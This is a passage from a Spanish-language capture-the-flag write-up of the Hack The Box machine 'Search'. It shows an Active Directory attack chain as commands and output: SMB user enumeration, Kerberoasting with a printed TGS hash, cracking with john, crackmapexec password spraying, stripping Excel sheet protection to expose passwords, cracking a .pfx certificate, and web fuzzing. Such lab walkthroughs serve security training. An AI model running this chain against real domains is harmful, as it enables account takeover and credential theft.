        dr--r--r--                0 Thu Nov 18 02:01:45 2021    sierra.frye
        dr--r--r--                0 Thu Apr  9 22:14:26 2020    trace.ryan
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Procedemos a crearnos un listado de Usuarios Potenciales.&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# smbmap -u &apos;hope.sharp&apos; -p &apos;IsolationIsKey?&apos; -H 10.10.11.129 -r &apos;RedirectedFolders$&apos; | awk &apos;NF{print $NF}&apos; | tail -n 23 &amp;gt; &quot;users.txt&quot;&lt;/span&gt;
abril.suarez
Angie.Duffy
Antony.Russo
belen.compton
Cameron.Melendez
chanel.bell
Claudia.Pugh
Cortez.Hickman
dax.santiago
Eddie.Stevens
edgar.jacobs
Edith.Walls
eve.galvan
frederick.cuevas
hope.sharp
jayla.roberts
Jordan.Gregory
payton.harmon
Reginald.Morton
santino.benjamin
Savanah.Velazquez
sierra.frye
trace.ryan
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Procedo a realizar un ASPRepRoast Attack con el listado de usuarios encontrado:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;No encontramos ningun usuario ASPRepRoasteable
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Procedemos a realizar un Kerberoasting Attack ya que tenemos las credenciales para el usuario Hope.Sharp&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# GetUserSPNs.py search.htb/hope.sharp:&apos;IsolationIsKey?&apos;&lt;/span&gt;
Impacket v0.9.24.dev1+20210827.162957.5aa97fa7 - Copyright 2021 SecureAuth Corporation

ServicePrincipalName               Name     MemberOf  PasswordLastSet             LastLogon  Delegation 
&lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;-------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;--------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;--------------------------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;---------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;----------&lt;/span&gt;
RESEARCH/web_svc.search.htb:60001  web_svc            2020-04-09 14:59:11.329031  &amp;lt;never&amp;gt; 

&lt;span class=&quot;c&quot;&gt;# GetUserSPNs.py search.htb/hope.sharp:&apos;IsolationIsKey?&apos; -request&lt;/span&gt;
Impacket v0.9.24.dev1+20210827.162957.5aa97fa7 - Copyright 2021 SecureAuth Corporation

ServicePrincipalName               Name     MemberOf  PasswordLastSet             LastLogon  Delegation 
&lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;-------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;--------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;--------------------------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;---------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;----------&lt;/span&gt;
RESEARCH/web_svc.search.htb:60001  web_svc            2020-04-09 14:59:11.329031  &amp;lt;never&amp;gt;               



&lt;span class=&quot;nv&quot;&gt;$krb5tgs$23$*&lt;/span&gt;web_svc&lt;span class=&quot;nv&quot;&gt;$SEARCH&lt;/span&gt;.HTB&lt;span class=&quot;nv&quot;&gt;$search&lt;/span&gt;.htb/web_svc&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$cbf7ed318a7ad8cef8eb9e0e46d358f2$bf63b6d423102abf531eb367994089d64a58d07aa240148ae60a26dd7e4c556b5a5916833b383160108453c1c1ee2cce944fa0a37024e5843d01c522a7a3169d622839224ae5132b1a83b77d2c6d0157fd046088594e020325b94c4adc9bfb3cec364a71962220599f0fede8af038bbc894748faade1ac12305969d26705a97902f3e8ea4ed9073a03c21ff05681f6da028330c3a399a006111936fdccf0fa74f8f97e4c9f8ab1fa410d9a1814ab455d9c4402a54a0ec8011b62d076858471b66413743908639c886cf4f6735605c44fc82794d87231cfab376d6aba77654634c293afa887fde00e430a2be1c381608a0d49ec454d7017f137c1308347702aa0e34f144ac7d917984e5d46dc64d06212bc292bb5e3a9f47b3bb2eed119ca8477250f70246882243dde35cbee1d206ffb0f01362aceb7dd6a96c12ebb40cd94e4d7301123556c1506218961effc6d5bd3be6cae7d312a9f9e2a702132c385cf8cb7b790a3b6d1aa81fc9cb424805dbac398d35f2ffd3dd41e1a3014bbc41933b298c18796890c164ac99ff19581a67be244242e033ee6541596c57055a84c47e05be885cca5ed5f6db6e99036a2ab307c1b07bb96f0618267831f7fe203d16766318c109893b7b516bdda7eb07c2810c7dd6ac21cd0f3e738c82a0de6244d2cc83fc69edd068fe5912cfedb7933aa64fd5b020a575dc297f5a4ca4b38d0287cd8393219ad552f0bdfc0a487a44100fa0732d5477f2e7571d965e1d2e4ecdff110a28b35b4c53010d7d737c4a11614f679f86dd06b9e161825bcdc400c146a0cf2b43816bb4fcc22f86ca98c90f13d7f807f221d5c5b7f9cc136249432ddcb50be81d2bfc7d62a085ee7cbc2ded6a2b655abf119bb1d1a16116354b4f83e35ab2842f77a44f1156749b2c96ab21b25bd6b971260350ef6446f0674ecf409bc4b0b5d9f5adc4fdc729177e9a7c5fad3ac215ffca8e32e2f6a944efd3f0c630c74f17529631599eb24e1363056f3f544b6951a8b0749065c90f60b4bcf2c431f3c0827fc7135a4c22fdc3189a56bf03851ba0c97bfa5379e18912c0bba137b360ab1b9e44a921176e3d0f2f961bb4fd1ff3bcbb0d7b4b5e82a95ea6d4bbb1896cd36f665b05a8e63c3e9b7885e11b9b2a0c84b946ad34985f4215db8c075127149baae3a4e967e7754790c701f8fabb802ae25d605446581ad6e84bb30445fb49c87ebdb392678a78dccfe9c77a0cd724d143dd2051a7f4dc21ccd1d83ce673354fc4ef171dff5f9bc8bfe4cc72c4f4ed3c538f01129b46ea227c0b378555c807fee342a2fde76aebcb8dec3535d9ae58e22310a4b7483c023047e10c46efbef021ed13c5a7034213aa2b7671569fdfaeb9632c2e8827e7f3f660d68837ed0fb069ad62575c649dd894d47e5f624d1fbd53a9653b0fed574873757319e4439f98ffb966844bc39b7a65915d18efdca4687893994680aa4&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Procedemos a a intentar Crackear el TGS para sacar la password en texto claro&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# john --wordlist=/usr/share/wordlists/rockyou.txt hash_web_svc &lt;/span&gt;
Using default input encoding: UTF-8
Loaded 1 password &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;krb5tgs, Kerberos 5 TGS etype 23 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;MD4 HMAC-MD5 RC4]&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Will run 8 OpenMP threads
Press &lt;span class=&quot;s1&quot;&gt;&apos;q&apos;&lt;/span&gt; or Ctrl-C to abort, almost any other key &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;status
&lt;span class=&quot;s2&quot;&gt;&quot; @3ONEmillionbaby (web_svc)  &quot;&lt;/span&gt;   
1g 0:00:00:03 DONE &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2022-06-06 12:03&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 0.3012g/s 3461Kp/s 3461Kc/s 3461KC/s @4208891ncv..?!&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Dopey&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;?!
Use the &lt;span class=&quot;s2&quot;&gt;&quot;--show&quot;&lt;/span&gt; option to display all of the cracked passwords reliably
Session completed.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Procedo a hacer un password Spray con el listado de usuarios y la nueva contraseña conseguida&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# crackmapexec smb 10.10.11.129 -u users -p &apos;@3ONEmillionbaby&apos; --continue-on-success          &lt;/span&gt;
SMB         10.10.11.129    445    RESEARCH         &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Windows 10.0 Build 17763 x64 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;name:RESEARCH&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;domain:search.htb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;signing:True&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SMBv1:False&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                                            
SMB         10.10.11.129    445    RESEARCH         &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] search.htb&lt;span class=&quot;se&quot;&gt;\w&lt;/span&gt;eb_svc:@3ONEmillionbaby                                                                                                                                                      
SMB         10.10.11.129    445    RESEARCH         &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] search.htb&lt;span class=&quot;se&quot;&gt;\e&lt;/span&gt;dgar.jacobs:@3ONEmillionbaby
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Procedo a seguir ojeando los recursos de SMB para el nuevo usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;edgar.jacobs&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# smbmap -u &apos;edgar.jacobs&apos; -p &apos;@3ONEmillionbaby&apos; -H 10.10.11.129 -r &apos;RedirectedFolders$/edgar.jacobs/Desktop&apos;  &lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] IP: 10.10.11.129:445        Name: search.htb                                        
        Disk                                                    Permissions     Comment
        &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;                                                    &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;     &lt;span class=&quot;nt&quot;&gt;-------&lt;/span&gt;
        RedirectedFolders&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;                                     READ, WRITE
        .&lt;span class=&quot;se&quot;&gt;\R&lt;/span&gt;edirectedFolders&lt;span class=&quot;nv&quot;&gt;$edgar&lt;/span&gt;.jacobs&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop&lt;span class=&quot;se&quot;&gt;\*&lt;/span&gt;
        dw--w--w--                0 Mon Aug 10 12:02:16 2020    &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
        dw--w--w--                0 Mon Aug 10 12:02:16 2020    ..
        dr--r--r--                0 Thu Apr  9 22:05:29 2020    &lt;span class=&quot;nv&quot;&gt;$RECYCLE&lt;/span&gt;.BIN
        fr--r--r--              282 Mon Aug 10 12:02:16 2020    desktop.ini
        fr--r--r--             1450 Thu Apr  9 22:05:03 2020    Microsoft Edge.lnk
        fr--r--r--            23130 Mon Aug 10 12:30:05 2020   &lt;span class=&quot;s2&quot;&gt;&quot; Phishing_Attempt.xlsx&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Encontramos un recurso nuevo que nos traemos a nuestra maquina atacante&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# smbmap -u &apos;edgar.jacobs&apos; -p &apos;@3ONEmillionbaby&apos; -H 10.10.11.129 --download &apos;RedirectedFolders$/edgar.jacobs/Desktop/Phishing_Attempt.xlsx&apos;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Starting download: RedirectedFolders&lt;span class=&quot;nv&quot;&gt;$\&lt;/span&gt;edgar.jacobs&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;hishing_Attempt.xlsx &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;23130 bytes&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] File output to: /home/pro/Escritorio/HTB/Search/content/10.10.11.129-RedirectedFolders_edgar.jacobs_Desktop_Phishing_Attempt.xlsx
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Procedemos a movernos el archivo a una carpeta vacia y abrirlo, al abrirlo vemos que falta una Columna ‘C’ y procedemos a realizar un ‘unzip’ para Bypassear las Restricciones del Excell&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; Procedimiento a Seguir :
 unzip Phishing_Attempt.xlsx
 sed-i&lt;span class=&quot;s1&quot;&gt;&apos;s/&amp;lt;sheetProtection[^&amp;gt;]*&amp;gt;//&apos;&lt;/span&gt; xl/worksheets/sheet2.xml
 zip &lt;span class=&quot;nt&quot;&gt;-fr&lt;/span&gt; Phishing_Attempt.xlsx &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# ls    &lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&apos;[Content_Types].xml&apos;&lt;/span&gt;   docProps   Phishing_Attempt.xlsx   _rels   xl                                                                                                                                                   

&lt;span class=&quot;c&quot;&gt;# Procedemos a modificar el archivo sheet2.xml para quitar la &amp;lt;sheetProtection&amp;gt; y volver a zipear el archivo quitando la proteccion&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# zip -fr Phishing_Attempt.xlsx *&lt;/span&gt;
freshening: xl/worksheets/sheet2.xml &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;deflated 73%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# ls&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&apos;[Content_Types].xml&apos;&lt;/span&gt;   docProps   Phishing_Attempt.xlsx   _rels   xl

&lt;span class=&quot;c&quot;&gt;# wps Phishing_Attempt.xlsx &lt;/span&gt;

Firstname	lastname	password	                        Username
Payton	Harmon	        &lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt;36!cried!INDIA!year!50&lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt;	        Payton.Harmon
Cortez	Hickman	        ..10-time-TALK-proud-66..	        Cortez.Hickman
Bobby	Wolf	        ??47^before^WORLD^surprise^91??	    Bobby.Wolf
Margaret Robinson	    //51+mountain+DEAR+noise+83//	    Margaret.Robinson
Scarlett Parks	        ++47|building|WARSAW|gave|60++	    Scarlett.Parks
Eliezer	Jordan	        &lt;span class=&quot;o&quot;&gt;!!&lt;/span&gt;05_goes_SEVEN_offer_83!!	        Eliezer.Jordan
Hunter Kirby	        ~~27%when%VILLAGE%full%00~~	        Hunter.Kirby
Sierra Frye	            &lt;span class=&quot;nv&quot;&gt;$$49&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;wide&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;STRAIGHT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;jordan&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;28&lt;span class=&quot;nv&quot;&gt;$$&lt;/span&gt;18	Sierra.Frye
Annabelle Wells	        &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;95~pass~QUIET~austria~77&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;	    Annabelle.Wells
Eve	Galvan	            //61!banker!FANCY!measure!25//	    Eve.Galvan
Jeramiah Fritz	        ??40:student:MAYOR:been:66??	    Jeramiah.Fritz
Abby Gonzalez	        &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt;75:major:RADIO:state:93&amp;amp;&amp;amp;	        Abby.Gonzalez
Joy	Costa	            &lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;30&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;venus&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;BALL&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;office&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;42&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;	        Joy.Costa
Vincent	Sutton	        &lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;24&amp;amp;moment&amp;amp;BRAZIL&amp;amp;members&amp;amp;66&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;	    Vincent.Sutton
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Procedemos a probar las contraseñas encontradas para los usuarios encontrados&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# crackmapexec smb 10.10.11.129 -u sierra.frye -p &apos;$$49=wide=STRAIGHT=jordan=28$$18&apos;                                                                        &lt;/span&gt;
SMB         10.10.11.129    445    RESEARCH         &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Windows 10.0 Build 17763 x64 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;name:RESEARCH&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;domain:search.htb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;signing:True&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SMBv1:False&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
SMB         10.10.11.129    445    RESEARCH         &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] search.htb&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ierra.frye:&lt;span class=&quot;nv&quot;&gt;$$49&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;wide&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;STRAIGHT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;jordan&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;28&lt;span class=&quot;nv&quot;&gt;$$&lt;/span&gt;18 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Procedemos a comprobar los Recursos de SMB para este usuario.&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# smbmap -u &apos;sierra.frye&apos; -p &apos;$$49=wide=STRAIGHT=jordan=28$$18&apos; -H 10.10.11.129 -r &apos;RedirectedFolders$/sierra.frye&apos;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] IP: 10.10.11.129:445        Name: search.htb                                        
        Disk                                                    Permissions     Comment
        &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;                                                    &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;     &lt;span class=&quot;nt&quot;&gt;-------&lt;/span&gt;
        RedirectedFolders&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;                                     READ, WRITE
        .&lt;span class=&quot;se&quot;&gt;\R&lt;/span&gt;edirectedFolders&lt;span class=&quot;nv&quot;&gt;$sierra&lt;/span&gt;.frye&lt;span class=&quot;se&quot;&gt;\*&lt;/span&gt;
        dr--r--r--                0 Thu Nov 18 02:01:45 2021    &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
        dr--r--r--                0 Thu Nov 18 02:01:45 2021    ..
        dw--w--w--                0 Thu Nov 18 02:08:17 2021    Desktop
        dw--w--w--                0 Fri Jul 31 16:42:19 2020    Documents
        dw--w--w--                0 Fri Jul 31 16:45:36 2020    Downloads
        fr--r--r--               33 Thu Nov 18 02:01:45 2021    &lt;span class=&quot;s2&quot;&gt;&quot;user.txt&quot;&lt;/span&gt;
                                                                                                                                                                                                                                                 
&lt;span class=&quot;c&quot;&gt;# smbmap -u &apos;sierra.frye&apos; -p &apos;$$49=wide=STRAIGHT=jordan=28$$18&apos; -H 10.10.11.129 --download &apos;RedirectedFolders$/sierra.frye/user.txt&apos;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Starting download: RedirectedFolders&lt;span class=&quot;nv&quot;&gt;$\&lt;/span&gt;sierra.frye&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;ser.txt &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;33 bytes&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] File output to: /home/pro/Escritorio/HTB/Search/content/10.10.11.129-RedirectedFolders_sierra.frye_user.txt

&lt;span class=&quot;c&quot;&gt;# cat user.txt                                                                      &lt;/span&gt;
39d6dde72c8e6b2a0d4exxxxxxxxxxxxxxxxx
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Enumeramos un poco mas ..&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# smbmap -u &apos;sierra.frye&apos; -p &apos;$$49=wide=STRAIGHT=jordan=28$$18&apos; -H 10.10.11.129 -r &apos;RedirectedFolders$/sierra.frye/Downloads&apos;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] IP: 10.10.11.129:445        Name: search.htb                                        
        Disk                                                    Permissions     Comment
        &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;                                                    &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;     &lt;span class=&quot;nt&quot;&gt;-------&lt;/span&gt;
        RedirectedFolders&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;                                     READ, WRITE
        .&lt;span class=&quot;se&quot;&gt;\R&lt;/span&gt;edirectedFolders&lt;span class=&quot;nv&quot;&gt;$sierra&lt;/span&gt;.frye&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ownloads&lt;span class=&quot;se&quot;&gt;\*&lt;/span&gt;
        dw--w--w--                0 Fri Jul 31 16:45:36 2020    &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
        dw--w--w--                0 Fri Jul 31 16:45:36 2020    ..
        dr--r--r--                0 Thu Jul 30 19:25:57 2020    &lt;span class=&quot;nv&quot;&gt;$RECYCLE&lt;/span&gt;.BIN
        dr--r--r--                0 Mon Aug 10 22:39:17 2020    Backups
        fr--r--r--              282 Fri Jul 31 16:42:18 2020    desktop.ini

&lt;span class=&quot;c&quot;&gt;# smbmap -u &apos;sierra.frye&apos; -p &apos;$$49=wide=STRAIGHT=jordan=28$$18&apos; -H 10.10.11.129 -r &apos;RedirectedFolders$/sierra.frye/Downloads/Backups&apos; &lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] IP: 10.10.11.129:445        Name: search.htb                                        
        Disk                                                    Permissions     Comment
        &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;                                                    &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;     &lt;span class=&quot;nt&quot;&gt;-------&lt;/span&gt;
        RedirectedFolders&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;                                     READ, WRITE
        .&lt;span class=&quot;se&quot;&gt;\R&lt;/span&gt;edirectedFolders&lt;span class=&quot;nv&quot;&gt;$sierra&lt;/span&gt;.frye&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ownloads&lt;span class=&quot;se&quot;&gt;\B&lt;/span&gt;ackups&lt;span class=&quot;se&quot;&gt;\*&lt;/span&gt;
        dr--r--r--                0 Mon Aug 10 22:39:17 2020    &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
        dr--r--r--                0 Mon Aug 10 22:39:17 2020    ..
        fr--r--r--             2643 Fri Jul 31 17:04:11 2020    search-RESEARCH-CA.p12
        fr--r--r--             4326 Mon Aug 10 22:39:17 2020    staff.pfx

&lt;span class=&quot;c&quot;&gt;# smbmap -u &apos;sierra.frye&apos; -p &apos;$$49=wide=STRAIGHT=jordan=28$$18&apos; -H 10.10.11.129 --download &apos;RedirectedFolders$/sierra.frye/Downloads/Backups/staff.pfx&apos;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Starting download: RedirectedFolders&lt;span class=&quot;nv&quot;&gt;$\&lt;/span&gt;sierra.frye&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ownloads&lt;span class=&quot;se&quot;&gt;\B&lt;/span&gt;ackups&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;taff.pfx &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;4326 bytes&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] File output to: /home/pro/Escritorio/HTB/Search/content/10.10.11.129-RedirectedFolders_sierra.frye_Downloads_Backups_staff.pfx

&lt;span class=&quot;c&quot;&gt;# smbmap -u &apos;sierra.frye&apos; -p &apos;$$49=wide=STRAIGHT=jordan=28$$18&apos; -H 10.10.11.129 --download &apos;RedirectedFolders$/sierra.frye/Downloads/Backups/search-RESEARCH-CA.p12&apos;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Starting download: RedirectedFolders&lt;span class=&quot;nv&quot;&gt;$\&lt;/span&gt;sierra.frye&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ownloads&lt;span class=&quot;se&quot;&gt;\B&lt;/span&gt;ackups&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;earch-RESEARCH-CA.p12 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2643 bytes&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] File output to: /home/pro/Escritorio/HTB/Search/content/10.10.11.129-RedirectedFolders_sierra.frye_Downloads_Backups_search-RESEARCH-CA.p12
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez descargados los dos archivos vemos que estamos ante un archivo .pfx (el cual podemos crackear) y un certificado que podemos importar en Firefox para acceder a algun recurso..&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# pfx2john staff.pfx &amp;gt; hash_pfx&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# # john  hash_pfx --show   &lt;/span&gt;
staff.pfx:misspissy:::::staff.pfx

1 password &lt;span class=&quot;nb&quot;&gt;hash &lt;/span&gt;cracked, 0 left
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Procedemos a hacer fuzzing en la pagina web&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.11.129/FUZZ&lt;/span&gt;

Target: http://10.10.11.129/FUZZ
Total requests: 220548

&lt;span class=&quot;o&quot;&gt;=====================================================================&lt;/span&gt;
